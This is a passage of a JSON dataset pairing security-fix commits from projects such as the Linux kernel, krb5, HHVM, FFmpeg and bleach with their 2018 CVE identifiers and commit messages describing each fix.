CVE-2018-8799 * Fix remote code execution in in ui_clip_handle_data - CVE-2018-8800 * Fix major information leak in ui_clip_handle_data - CVE-2018-20174 * Fix memory corruption in rdp_in_unistr - CVE-2018-20177 * Fix Denial of Service in process_demand_active - CVE-2018-20178 * Fix remote code execution in lspci_process - CVE-2018-20179 * Fix remote code execution in rdpsnddbg_process - CVE-2018-20180 * Fix remote code execution in seamless_process - CVE-2018-20181 * Fix remote code execution in seamless_process_line - CVE-2018-20182",
    "cveIds": [
      "CVE-2018-20174",
      "CVE-2018-20175",
      "CVE-2018-20176",
      "CVE-2018-20177",
      "CVE-2018-20178",
      "CVE-2018-20181",
      "CVE-2018-20182"
    ],
    "cveIdsCount": 7
  },
  "e300706a412b41beddde144a25ca43307989938608b3e1e6951c90073f6d318d": {
    "url": "https://github.com/torvalds/linux/commit/c095508770aebf1b9218e77026e48345d719b17c",
    "title": "RDS: Heap OOB write in rds_message_alloc_sgs()",
    "body": "When args->nr_local is 0, nr_pages gets also 0 due some sizecalculation via rds_rm_size(), which is later used to allocatepages for DMA, this bug produces a heap Out-Of-Bound write accessto a specific memory region.Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2018-5332"
    ],
    "cveIdsCount": 1
  },
  "6c5d4891ab41f5fbce637549cc1f1db8db4b00867d1b8c493591772bc781ba15": {
    "url": "https://github.com/torvalds/linux/commit/7d11f77f84b27cef452cee332f4e469503084737",
    "title": "RDS: null pointer dereference in rds_atomic_free_op",
    "body": "set rm->atomic.op_active to 0 when rds_pin_pages() failsor the user supplied address is invalid,this prevents a NULL pointer usage in rds_atomic_free_op()Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com>Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2018-5333"
    ],
    "cveIdsCount": 1
  },
  "13ee0d7d579a500a094a67a39e53f3b58a17623fe6cfb126db77cbad9f85da8e": {
    "url": "https://github.com/torvalds/linux/commit/ae6650163c66a7eff1acd6eb8b0f752dcfa8eba5",
    "title": "loop: fix concurrent lo_open/lo_release",
    "body": "范龙飞 reports that KASAN can report a use-after-free in __lock_acquire.The reason is due to insufficient serialization in lo_release(), whichwill continue to use the loop device even after it has decremented thelo_refcnt to zero.In the meantime, another process can come in, open the loop deviceagain as it is being shut down. Confusion ensues.Reported-by: 范龙飞 <long7573@126.com>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>Signed-off-by: Jens Axboe <axboe@kernel.dk>",
    "cveIds": [
      "CVE-2018-5344"
    ],
    "cveIdsCount": 1
  },
  "df95b0566a2da3ee75fb9d762aaa40c653a678f92af4e0191f2f22a21ebbef75": {
    "url": "https://github.com/ILIAS-eLearning/ILIAS/commit/c0f326d05231072e33679b84835c03d5043255cb",
    "title": "Fixed output of \"cmd\" parameter",
    "body": "(cherry picked from commit 2106df4)",
    "cveIds": [
      "CVE-2018-5688"
    ],
    "cveIdsCount": 1
  },
  "fe8a06ae1556f4331fad3f83349d0ba2a078eec7edc57f0b0cba630dc5482c76": {
    "url": "https://github.com/krb5/krb5/commit/e1caf6fb74981da62039846931ebdffed71309d1",
    "title": "Fix flaws in LDAP DN checking",
    "body": "KDB_TL_USER_INFO tl-data is intended to be internal to the LDAP KDBmodule, and not used in disk or wire principal entries. Preventkadmin clients from sending KDB_TL_USER_INFO tl-data by giving it atype number less than 256 and filtering out type numbers less than 256in kadm5_create_principal_3(). (We already filter out low typenumbers in kadm5_modify_principal()).In the LDAP KDB module, if containerdn and linkdn are both specifiedin a put_principal operation, check both linkdn and the computedstandalone_principal_dn for container membership. To that end, factorout the checks into helper functions and call them on all applicableclient-influenced DNs.CVE-2018-5729:In MIT krb5 1.6 or later, an authenticated kadmin user with permissionto add principals to an LDAP Kerberos database can cause a nulldereference in kadmind, or circumvent a DN container check, bysupplying tagged data intended to be internal to the database module.Thanks to Sharwan Ram and Pooja Anil for discovering the potentialnull dereference.CVE-2018-5730:In MIT krb5 1.6 or later, an authenticated kadmin user with permissionto add principals to an LDAP Kerberos database can circumvent a DNcontainership check by supplying both a \"linkdn\" and \"containerdn\"database argument, or by supplying a DN string which is a leftextension of a container DN string but is not hierarchically withinthe container DN.ticket: 8643 (new)tags: pulluptarget_version: 1.16-nexttarget_version: 1.15-next",
    "cveIds": [
      "CVE-2018-5729"
    ],
    "cveIdsCount": 1
  },
  "cb2e8f0d0743ff259c0dd46a1749cb3f97fbfdd5bd6558ead98b382402a3e726": {
    "url": "https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850",
    "title": "External Libraries: Remove unnecessary / obsoleted MediaElement.js fi…",
    "body": "…les.Props joemcgill.Fixes #42720 for trunk.Built from https://develop.svn.wordpress.org/trunk@42462git-svn-id: http://core.svn.wordpress.org/trunk@42291 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2018-5776"
    ],
    "cveIdsCount": 1
  },
  "4f367f0da21f185a9fb14247f79aa81e796ee13daaf0b670fa65874b1d9aa27f": {
    "url": "https://github.com/yiisoft/yii2/commit/6b0be47e0fa9c532e03b07b4369050582fcf5c7a",
    "title": "Fixes #14711: Fixed yii\\web\\ErrorHandler displaying exception messa…",
    "body": "…ge in non-debug mode",
    "cveIds": [
      "CVE-2018-6010"
    ],
    "cveIdsCount": 1
  },
  "b825fd60dbbfc78a847008d5cf1004e2d09099f235a1eb1e74bb8ce9126cd652": {
    "url": "https://github.com/tats/w3m/commit/7fdc83b0364005a0b5ed869230dd81752ba022e8",
    "title": "Prevent invalid columnPos() call in formUpdateBuffer()",
    "body": "Bug-Debian: #89",
    "cveIds": [
      "CVE-2018-6197"
    ],
    "cveIdsCount": 1
  },
  "bf4cf0a4b1b595f90163997e4e7e471b53fd941d8b116cfa55cdf61c82d22063": {
    "url": "https://github.com/facebook/nuclide/commit/65f6bbd683404be1bb569b8d1be84b5d4c74a324",
    "title": "Ignore invalid hostnames in hhvm-attach deep link",
    "body": "Summary: Provide nicer handling and an error message when following a deep link requesting HHVM debugger attach that has a malformed host name.Reviewed By: hansonwDifferential Revision: D7308417fbshipit-source-id: 60bae4013444008980dda9cda8dec5f8ae20944f",
    "cveIds": [
      "CVE-2018-6333"
    ],
    "cveIdsCount": 1
  },
  "04bed04901d5bb555ebf20539494cdb3510eb62d2af495ff93e7e7fc14fe73eb": {
    "url": "https://github.com/facebook/hhvm/commit/6937de5544c3eead3466b75020d8382080ed0cff",
    "title": "[security][CVE-2018-6334] kill globals for file uploads in hhvm",
    "body": "Code should look at _GET, _POST, _FILES, etc. directly to avoid security concerns.This included both `$GLOBALS` and `register_globals`-like behavior.CVE-2018-6334",
    "cveIds": [
      "CVE-2018-6334"
    ],
    "cveIdsCount": 1
  },
  "1f9467f619edce270ed7405cde76d8d5f03521a0d75164ac835217fb64d9dec1": {
    "url": "https://github.com/facebook/hhvm/commit/4cb57dd753a339654ca464c139db9871fe961d56",
    "title": "[security][CVE-2018-6335] Fix potential crash in HTTP2 padding handling",
    "body": "CVE-2018-6335",
    "cveIds": [
      "CVE-2018-6335"
    ],
    "cveIdsCount": 1
  },
  "5d5e69c2b9fcb39c4600e95be738f3c1c365888e2b1b426a71143083f08f0c96": {
    "url": "https://github.com/facebook/hhvm/commit/e2d10a1e32d01f71aaadd81169bcb9ae86c5d6b8",
    "title": "[security][CVE-2018-6337] Flush folly::secureRandom buffer on fork",
    "body": "D8109884 D8110240CVE-2018-6337",
    "cveIds": [
      "CVE-2018-6337"
    ],
    "cveIdsCount": 1
  },
  "44f3e51dcdaec694fadf1e50f2712ce68070563e485b432f6376fefb463b3cea": {
    "url": "https://github.com/facebook/folly/commit/8e927ee48b114c8a2f90d0cbd5ac753795a6761f",
    "title": "Flush secureRandom buffer on fork",
    "body": "Summary: On fork, flush the secureRandom buffer, so that we don't share entropy between the parent and child.Reviewed By: ricklavoieDifferential Revision: D9196474fbshipit-source-id: 12ff8488d814466186df61328a5f1d4000beb27f",
    "cveIds": [
      "CVE-2018-6337"
    ],
    "cveIdsCount": 1
  },
  "bfd5f08d79524684e7a6c260172e50a1f5d2b2a2e6696eee8ac9a7582872070f": {
    "url": "https://github.com/facebook/hhvm/commit/4bff3bfbe90d10451e4638c2118d1ad1117bb3e3",
    "title": "CVE-2018-6340 Fix buffer overread",
    "body": "Summary:snprintf() returns the number of would be written bytes if the buffer hadenough size, letting the original code to construct output string fromarbitrary data on the stack.Fix this by properly assembling the String without trying to arbitrarilylimiting the length to 30 bytes.Reviewed By: ottoniDifferential Revision: D13509547fbshipit-source-id: aa401b83d356f5b261433c4b16d777948ba7f9b4",
    "cveIds": [
      "CVE-2018-6340"
    ],
    "cveIdsCount": 1
  },
  "13dc2c7fddd1900dfbe054efa864293941429de6dece3ef6c56d33438f683dcf": {
    "url": "https://github.com/facebook/proxygen/commit/0600ebe59c3e82cd012def77ca9ca1918da74a71",
    "title": "Check that a secondary auth manager is set before dereferencing.",
    "body": "Summary: CVE-2018-6343Reviewed By: mingtaoyDifferential Revision: D12994423fbshipit-source-id: 9229ec11da8085f1fa153595e8e5353e19d06fb7",
    "cveIds": [
      "CVE-2018-6343"
    ],
    "cveIdsCount": 1
  },
  "ca66b1874326533ef47d4ef694019412e0524cde6bddb243668c0d2396a728d3": {
    "url": "https://github.com/facebook/hhvm/commit/190ffdf6c8b1ec443be202c7d69e63a7e3da25e3",
    "title": "Fix a bug in number_format()",
    "body": "Summary: In case of error while calling snprintf, return empty string instead of malformed string.Reviewed By: binliu19Differential Revision: D13379372fbshipit-source-id: 1e5611598464daccc674d5a96558c9f2aee08fc8",
    "cveIds": [
      "CVE-2018-6345"
    ],
    "cveIdsCount": 1
  },
  "b15c68f11a5504aa3762195e364a44b4858fb973ed894cea23ec45c0e0ba046c": {
    "url": "https://github.com/facebook/proxygen/commit/223e0aa6bc7590e86af1e917185a2e0efe160711",
    "title": "Don't lower lastStreamID_",
    "body": "Summary:This could throw off the logic about what is headers/trailersCVE-2018-6347Reviewed By: avasylev, bolekkDifferential Revision: D13521704fbshipit-source-id: ed436ff13f191bf04764494973fcb73b35ed1256",
    "cveIds": [
      "CVE-2018-6347"
    ],
    "cveIdsCount": 1
  },
  "230e9d0fc9f13c603a308e5614c1628707d6b5ee2ef0f5e949aa3ff8e1e673b1": {
    "url": "https://github.com/mpv-player/mpv/commit/e6e6b0dcc7e9b0dbf35154a179b3dc1fcfcaff43",
    "title": "ytdl_hook: whitelist protocols from urls retrieved from youtube-dl",
    "body": "Not very clean since there's a lot of potential unsafe urls that youtube-dlcan give us, depending on whether it's a single url, split tracks,playlists, segmented dash, etc.",
    "cveIds": [
      "CVE-2018-6360"
    ],
    "cveIdsCount": 1
  },
  "eaceb6d1d35cf0ade86a804658c09715c9a745227d7d46eb82460f684213b3ab": {
    "url": "https://github.com/torvalds/linux/commit/250c6c49e3b68756b14983c076183568636e2bde",
    "title": "fbdev: Fixing arbitrary kernel leak in case FBIOGETCMAP_SPARC in sbus…",
    "body": "…fb_ioctl_helper().Fixing arbitrary kernel leak in case FBIOGETCMAP_SPARC insbusfb_ioctl_helper().'index' is defined as an int in sbusfb_ioctl_helper().We retrieve this from the user:if (get_user(index, &c->index) || __get_user(count, &c->count) || __get_user(ured, &c->red) || __get_user(ugreen, &c->green) || __get_user(ublue, &c->blue)) return -EFAULT;and then we use 'index' in the following way:red = cmap->red[index + i] >> 8;green = cmap->green[index + i] >> 8;blue = cmap->blue[index + i] >> 8;This is a classic information leak vulnerability. 'index' should bean unsigned int, given its usage above.This patch is straight-forward; it changes 'index' to unsigned intin two switch-cases: FBIOGETCMAP_SPARC && FBIOPUTCMAP_SPARC.This patch fixes CVE-2018-6412.Signed-off-by: Peter Malone <peter.malone@gmail.com>Acked-by: Mathieu Malaterre <malat@debian.org>Signed-off-by: Bartlomiej Zolnierkiewicz <b.zolnierkie@samsung.com>",
    "cveIds": [
      "CVE-2018-6412"
    ],
    "cveIdsCount": 1
  },
  "359927d9e2d236ad49fa48ccdb3704c53b8f7a5fa0cb0492ef960f20efa7abd5": {
    "url": "https://github.com/mantisbt/mantisbt/commit/de686a9e6d8c909485b87ca09c8f912bf83082f2",
    "title": "Fix PHP error - wrong argument type",
    "body": "Initialize $t_filter variable as array() instead of '' incurrent_user_get_bug_filter(), to ensure its type is correct whencalling filter_ensure_valid_filter().Fixes #23921",
    "cveIds": [
      "CVE-2018-6526"
    ],
    "cveIdsCount": 1
  },
  "6791f706ad4b692f5d28314ac8db20066e3c2706e3b9f5249e944c1866adf920": {
    "url": "https://github.com/OpenMPT/openmpt/commit/b60b322cf9f0ffa624018f1bb9783edf0dc908c3",
    "title": "[Sec] STP: Possible out-of-bounds memory read with malformed STP file…",
    "body": "…s (caught with afl-fuzz).Patch-by: sagamusix(originally committed as part of r9568)git-svn-id: https://source.openmpt.org/svn/openmpt/branches/OpenMPT-1.27@9576 56274372-70c3-4bfc-bfc3-4c3a0b034d27",
    "cveIds": [
      "CVE-2018-6611"
    ],
    "cveIdsCount": 1
  },
  "a6b32faf1c01561a211c427f460fa230b83edbd86d35c67123d8743df4653bb9": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/22aa37c0fedf14531783189a197542a055959b6c",
    "title": "avcodec/utvideodec: Fix bytes left check in decode_frame()",
    "body": "Fixes: out of array readFixes: poc-2017.aviFound-by: GwanYeong Kim <gy741.kim@gmail.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit 118e1b0)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-6621"
    ],
    "cveIdsCount": 1
  },
  "fe12cb2dd01cd968db8a9ca2a23d47b33c8a84bd1110b9013048c5281046dc6a": {
    "url": "https://github.com/unbit/uwsgi/commit/cb4636f7c0af2e97a4eef7a3cdcbd85a71247bfe",
    "title": "improve uwsgi_expand_path() to sanitize input, avoiding stack corrupt…",
    "body": "…ion and potential security issue",
    "cveIds": [
      "CVE-2018-6758"
    ],
    "cveIdsCount": 1
  },
  "16b9b59a97fdb220815b797d38ba799a43af8615634a385e8f6425c157ca156a": {
    "url": "https://github.com/ether/etherpad-lite/commit/a03422b09468cdd5f192b05643311c705447588b",
    "title": "Merge pull request #3313 from rhelmer/sanitize-window-location",
    "body": "better sanitize window location in error messages",
    "cveIds": [
      "CVE-2018-6834"
    ],
    "cveIdsCount": 1
  },
  "007a0bbf58a6237a250c7e1e14139b5ca3e9813d0b86e290bbed3663c080c2a8": {
    "url": "https://github.com/ether/etherpad-lite/commit/626e58cc5af1db3691b41fca7b06c28ea43141b1",
    "title": "Merge pull request #3314 from rhelmer/sanitize-jsonp",
    "body": "better sanitize jsonp",
    "cveIds": [
      "CVE-2018-6835"
    ],
    "cveIdsCount": 1
  },
  "bf364e032c640169fbd7d145f015ed608778c2f643b33021347000e834af1b86": {
    "url": "https://github.com/MISP/MISP/commit/0a2aa9d52492d960b9a161160acedbe9caaa4126",
    "title": "fix: Fixed command execution for site admins",
    "body": "- a server setting allowing the override of the path variable for esoteric RHEL systems allowed site admins to inject arbitrary commands- impact was limited by the setting being only accessible to the site administrator- as reported by Michael Grolimund from Swiss Post (@grolinet)",
    "cveIds": [
      "CVE-2018-6926"
    ],
    "cveIdsCount": 1
  },
  "a414cb2d1c58877477a37de22d4833b8ecb2be3621523a875d60db99f2d21e85": {
    "url": "https://github.com/torvalds/linux/commit/fbe0e839d1e22d88810f3ee3e2f1479be4c0aa4a",
    "title": "futex: Prevent overflow by strengthen input validation",
    "body": "UBSAN reports signed integer overflow in kernel/futex.c: UBSAN: Undefined behaviour in kernel/futex.c:2041:18 signed integer overflow: 0 - -2147483648 cannot be represented in type 'int'Add a sanity check to catch negative values of nr_wake and nr_requeue.Signed-off-by: Li Jinyue <lijinyue@huawei.com>Signed-off-by: Thomas Gleixner <tglx@linutronix.de>Cc: peterz@infradead.orgCc: dvhart@infradead.orgCc: stable@vger.kernel.orgLink: https://lkml.kernel.org/r/1513242294-31786-1-git-send-email-lijinyue@huawei.com",
    "cveIds": [
      "CVE-2018-6927"
    ],
    "cveIdsCount": 1
  },
  "1ef98a322beb10ab5ce94bbd6a2f80e7854038dba7967463fec78873a57da49d": {
    "url": "https://github.com/robiso/wondercms/commit/64efdc4fd974c83cedd221b46e7c3854a81650ec",
    "title": "Update index.php",
    "body": "- Fixed vulnerability - logged in admin could delete files from any directory (added realpath).- Added SRI hashes to external JavaScript and CSS files: jquery.min.js, bootstrap.min.js, autosize.min.js, taboverride.min.js, jquery.taboverride.min.js, bootstrap.min.css).- Removed uneccessarry session unset.- Minor text changes.",
    "cveIds": [
      "CVE-2018-7172"
    ],
    "cveIdsCount": 1
  },
  "1c86c0b2b5536fc7d4db1b07f611f08c1282821eae3df122c902104c3092ef46": {
    "url": "https://github.com/DanBloomberg/leptonica/commit/ee301cb2029db8a6289c5295daa42bba7715e99a",
    "title": "Security fixes: expect final changes for release 1.75.3.",
    "body": "* Fixed a debian security issue with fscanf() reading a string with possible buffer overflow.* There were also a few similar situations with sscanf().",
    "cveIds": [
      "CVE-2018-7186"
    ],
    "cveIdsCount": 1
  },
  "5d6a46bebc3a78cd5a97a84eab42f623e78b99e377b84345e3744381b2f12ad7": {
    "url": "https://github.com/torvalds/linux/commit/5c25f65fd1e42685f7ccd80e0621829c105785d9",
    "title": "tun: allow positive return values on dev_get_valid_name() call",
    "body": "If the name argument of dev_get_valid_name() contains \"%d\", it will tryto assign it a unit number in __dev__alloc_name() and return either theunit number (>= 0) or an error code (< 0).Considering positive values as error values prevent tun device creationsrelying this mechanism, therefor we should only consider negative valuesas errors here.Signed-off-by: Julien Gomes <julien@arista.com>Acked-by: Cong Wang <xiyou.wangcong@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2018-7191"
    ],
    "cveIdsCount": 1
  },
  "0c6ab51296d341d1ef41aea9edb637d9a868b5b569f3bd89370ed64e0bbe8cf3": {
    "url": "https://github.com/torvalds/linux/commit/0ad646c81b2182f7fa67ec0c8c825e0ee165696d",
    "title": "tun: call dev_get_valid_name() before register_netdevice()",
    "body": "register_netdevice() could fail early when we have an invaliddev name, in which case ->ndo_uninit() is not called. For tundevice, this is a problem because a timer etc. are alreadyinitialized and it expects ->ndo_uninit() to clean them up.We could move these initializations into a ->ndo_init() sothat register_netdevice() knows better, however this is stillcomplicated due to the logic in tun_detach().Therefore, I choose to just call dev_get_valid_name() beforeregister_netdevice(), which is quicker and much easier to audit.And for this specific case, it is already enough.Fixes: 96442e4 (\"tuntap: choose the txq based on rxq\")Reported-by: Dmitry Alexeev <avekceeb@gmail.com>Cc: Jason Wang <jasowang@redhat.com>Cc: \"Michael S. Tsirkin\" <mst@redhat.com>Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2018-7191"
    ],
    "cveIdsCount": 1
  },
  "0805bad152e1f9e7932cb0b0d64dd94817260a5790761792884228c4bc021c74": {
    "url": "https://github.com/sinatra/sinatra/commit/6ad721abcfe36334108dcdd05d046c361e1b7a9c",
    "title": "Merge pull request #1387 from namusyaka/update-changelog",
    "body": "bump versions to 2.0.1.rc1",
    "cveIds": [
      "CVE-2018-7212"
    ],
    "cveIdsCount": 1
  },
  "81389998f9f127b03a0093a65c724545b88a29f21d780c2a2fc06eb19cf655d3": {
    "url": "https://github.com/DanBloomberg/leptonica/commit/c1079bb8e77cdd426759e466729917ca37a3ed9f",
    "title": "prog/htmlviewer: Catch unbound memory access (CID 1386222)",
    "body": "rootname can have any size, so limit the amount of copied bytes.Signed-off-by: Stefan Weil <sw@weilnetz.de>",
    "cveIds": [
      "CVE-2018-7247"
    ],
    "cveIdsCount": 1
  },
  "8aa90bf83e05d983e21458d28f6d38f42ff69e90e521ddbb5cdf84b11066d88b": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/d2886a3",
    "title": "Fix XSS vulnerability in central columns feature",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2018-7260"
    ],
    "cveIdsCount": 1
  },
  "713a8ed51b4a7d86932848140bac38526ae6b00637da549276ea84af16ab7069": {
    "url": "https://github.com/torvalds/linux/commit/f3069c6d33f6ae63a1668737bc78aaaa51bff7ca",
    "title": "rds: Fix NULL pointer dereference in __rds_rdma_map",
    "body": "This is a fix for syzkaller719569, where memory registration wasattempted without any underlying transport being loaded.Analysis of the case reveals that it is the setsockopt() RDS_GET_MR(2) and RDS_GET_MR_FOR_DEST (7) that are vulnerable.Here is an example stack trace when the bug is hit:BUG: unable to handle kernel NULL pointer dereference at 00000000000000c0IP: __rds_rdma_map+0x36/0x440 [rds]PGD 2f93d03067 P4D 2f93d03067 PUD 2f93d02067 PMD 0Oops: 0000 [#1] SMPModules linked in: bridge stp llc tun rpcsec_gss_krb5 nfsv4dns_resolver nfs fscache rds binfmt_misc sb_edac intel_powerclampcoretemp kvm_intel kvm irqbypass crct10dif_pclmul c rc32_pclmulghash_clmulni_intel pcbc aesni_intel crypto_simd glue_helper cryptdiTCO_wdt mei_me sg iTCO_vendor_support ipmi_si mei ipmi_devintf nfsdshpchp pcspkr i2c_i801 ioatd ma ipmi_msghandler wmi lpc_ich mfd_coreauth_rpcgss nfs_acl lockd grace sunrpc ip_tables ext4 mbcache jbd2mgag200 i2c_algo_bit drm_kms_helper ixgbe syscopyarea ahci sysfillrectsysimgblt libahci mdio fb_sys_fops ttm ptp libata sd_mod mlx4_core drmcrc32c_intel pps_core megaraid_sas i2c_core dca dm_mirrordm_region_hash dm_log dm_modCPU: 48 PID: 45787 Comm: repro_set2 Not tainted 4.14.2-3.el7uek.x86_64 #2Hardware name: Oracle Corporation ORACLE SERVER X5-2L/ASM,MOBO TRAY,2U, BIOS 31110000 03/03/2017task: ffff882f9190db00 task.stack: ffffc9002b994000RIP: 0010:__rds_rdma_map+0x36/0x440 [rds]RSP: 0018:ffffc9002b997df0 EFLAGS: 00010202RAX: 0000000000000000 RBX: ffff882fa2182580 RCX: 0000000000000000RDX: 0000000000000000 RSI: ffffc9002b997e40 RDI: ffff882fa2182580RBP: ffffc9002b997e30 R08: 0000000000000000 R09: 0000000000000002R10: ffff885fb29e3838 R11: 0000000000000000 R12: ffff882fa2182580R13: ffff882fa2182580 R14: 0000000000000002 R15: 0000000020000ffcFS: 00007fbffa20b700(0000) GS:ffff882fbfb80000(0000) knlGS:0000000000000000CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033CR2: 00000000000000c0 CR3: 0000002f98a66006 CR4: 00000000001606e0Call Trace: rds_get_mr+0x56/0x80 [rds] rds_setsockopt+0x172/0x340 [rds] ? __fget_light+0x25/0x60 ? __fdget+0x13/0x20 SyS_setsockopt+0x80/0xe0 do_syscall_64+0x67/0x1b0 entry_SYSCALL64_slow_path+0x25/0x25RIP: 0033:0x7fbff9b117f9RSP: 002b:00007fbffa20aed8 EFLAGS: 00000293 ORIG_RAX: 0000000000000036RAX: ffffffffffffffda RBX: 00000000000c84a4 RCX: 00007fbff9b117f9RDX: 0000000000000002 RSI: 0000400000000114 RDI: 000000000000109bRBP: 00007fbffa20af10 R08: 0000000000000020 R09: 00007fbff9dd7860R10: 0000000020000ffc R11: 0000000000000293 R12: 0000000000000000R13: 00007fbffa20b9c0 R14: 00007fbffa20b700 R15: 0000000000000021Code: 41 56 41 55 49 89 fd 41 54 53 48 83 ec 18 8b 87 f0 02 00 00 4889 55 d0 48 89 4d c8 85 c0 0f 84 2d 03 00 00 48 8b 87 00 03 00 00 <48>83 b8 c0 00 00 00 00 0f 84 25 03 00 0 0 48 8b 06 48 8b 56 08The fix is to check the existence of an underlying transport in__rds_rdma_map().Signed-off-by: Håkon Bugge <haakon.bugge@oracle.com>Reported-by: syzbot <syzkaller@googlegroups.com>Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2018-7492"
    ],
    "cveIdsCount": 1
  },
  "0229efa7bc75924cd6aba8bceec8ea06a07db2181185b87328ba0c70e5865e88": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/e724bd1dd9efea3abb8586d6644ec07694afceae",
    "title": "avcodec/utvideodec: Check subsample factors",
    "body": "Fixes: Out of array readFixes: heap_pocFound-by: GwanYeong Kim <gy741.kim@gmail.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit 7414d0b)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-7557"
    ],
    "cveIdsCount": 1
  },
  "6deb632b0a32dd7561629af06cad11fdc168ce31b6dfdd977a83c5551082a64e": {
    "url": "https://github.com/Enalean/tuleap/commit/0843c046eee54b16ec6a7753c575838212770189",
    "title": "Merge 'gerrit #10714' into stable/master",
    "body": "* commit 'd6701289ae': request #11217 Account takeover due to a missing CSRF protectionChange-Id: Id29f45cfa402f0cb378b9f257d1e7adb4b0d40be",
    "cveIds": [
      "CVE-2018-7634"
    ],
    "cveIdsCount": 1
  },
  "97622c49894cf2bad47247d0f280af8369ca43d111cceea1d56b5d2a30bb0005": {
    "url": "https://github.com/uclouvain/openjpeg/commit/cc3824767bde397fedb8a1ae4786a222ba860c8d",
    "title": "opj_mj2_extract: Check provided output prefix for length",
    "body": "This uses snprintf() with correct buffer length instead of sprintf(), whichprevents a buffer overflow when providing a long output prefix. Furthermorethe program exits with an error when the provided output prefix is too long.Fixes #1088.",
    "cveIds": [
      "CVE-2018-7648"
    ],
    "cveIdsCount": 1
  },
  "7ae50cdd4f0f4610c53040e8bab4dfe5b0d01217961e580b008e37beda64a7a5": {
    "url": "https://github.com/paramiko/paramiko/commit/fa29bd8446c8eab237f5187d28787727b4610516",
    "title": "Fixes CVE-2018-7750 / #1175",
    "body": "At least, insofar as the new tests pass...!",
    "cveIds": [
      "CVE-2018-7750"
    ],
    "cveIdsCount": 1
  },
  "665083cd0313336a059bc9513447ccc6f8b65951335414c0a5aa4d97d516e01d": {
    "url": "https://github.com/mozilla/bleach/releases/tag/v2.1.3",
    "title": "",
    "body": "-------------------------------**Security fixes*** Attributes that have URI values weren't properly sanitized if the values contained character entities. Using character entities, it was possible to construct a URI value with a scheme that was not allowed that would slide through unsanitized. This security issue was introduced in Bleach 2.1. Anyone using Bleach 2.1 is highly encouraged to upgrade.**Backwards incompatible changes**None**Features**None**Bug fixes*** Fixed some other edge cases for attribute URI value sanitizing and improved testing of this code.",
    "cveIds": [
      "CVE-2018-7753"
    ],
    "cveIdsCount": 1
  },
  "0481f7b5a2e12dc38c93108e7829c2039bec6faa35c23e602f3e95327c02e0cc": {
    "url": "https://github.com/mozilla/bleach/commit/c5df5789ec3471a31311f42c2d19fc2cf21b35ef",
    "title": "Merge pull request #356 from willkg/fix-entities",
    "body": "Fix url sanitizing",
    "cveIds": [
      "CVE-2018-7753"
    ],
    "cveIdsCount": 1
  },
  "892357b068bc4763a52cfcf3488f3cf867e2e29aa505f1220376ebc93cbdeca7": {
    "url": "https://github.com/jcupitt/libvips/commit/20d840e6da15c1574b3ed998bc92f91d1e36c2a5",
    "title": "fix a crash with delayed load",
    "body": "If a delayed load failed, it could leave the pipeline only half-set up.Sebsequent threads could then segv.Set a load-has-failed flag and test before generate.See https://github.com/jcupitt/libvips/issues/893",
    "cveIds": [
      "CVE-2018-7998"
    ],
    "cveIdsCount": 1
  },
  "f62d03873d479811c50289b31f4df5b03449ee09aa2af9e1c6068efd2c2c4c97": {
    "url": "https://github.com/torvalds/linux/commit/297a6961ffb8ff4dc66c9fbf53b924bd1dda05d5",
    "title": "net: phy: mdio-bcm-unimac: fix potential NULL dereference in unimac_m…",
    "body": "…dio_probe()platform_get_resource() may fail and return NULL, so we shouldbetter check it's return value to avoid a NULL pointer dereferencea bit later in the code.This is detected by Coccinelle semantic patch.@@expression pdev, res, n, t, e, e1, e2;@@res = platform_get_resource(pdev, t, n);+ if (!res)+ return -EINVAL;... when != res == NULLe = devm_ioremap(e1, res->start, e2);Signed-off-by: Wei Yongjun <weiyongjun1@huawei.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2018-8043"
    ],
    "cveIdsCount": 1
  },
  "d77f0525a06db3c1794ee703de6ff738989cffc3a9176d0d0d29e63fc03fc799": {
    "url": "https://github.com/sshock/AFFLIBv3/commit/435a2ca802358a3debb6d164d2c33049131df81c",
    "title": "Sanity check size passed to malloc...",
    "body": "Add sanity check before calling malloc in af_get_page() function toavoid undefined behavior (e.g., seg fault) when dealing with a corruptAFF image with an invalid pagesize.Issue found by Luis Rocha (luiscrocha@gmail.com).",
    "cveIds": [
      "CVE-2018-8050"
    ],
    "cveIdsCount": 1
  },
  "6080ffe1f033f9757f7d6e2c2e7c7f85dd4ed19b3558b99cfa69b23efc2ef1ac": {
    "url": "https://github.com/libgit2/libgit2/commit/3db1af1f370295ad5355b8f64b865a2a357bcac0",
    "title": "index: error out on unreasonable prefix-compressed path lengths",
    "body": "When computing the complete path length from the encodedprefix-compressed path, we end up just allocating the complete pathwithout ever checking what the encoded path length actually is. This caneasily lead to a denial of service by just encoding an unreasonable longpath name inside of the index. Git already enforces a maximum pathlength of 4096 bytes. As we also have that enforcement ready in someplaces, just make sure that the resulting path is smaller thanGIT_PATH_MAX.Reported-by: Krishna Ram Prakash R <krp@gtux.in>Reported-by: Vivek Parikh <viv0411.parikh@gmail.com>",
    "cveIds": [
      "CVE-2018-8098"
    ],
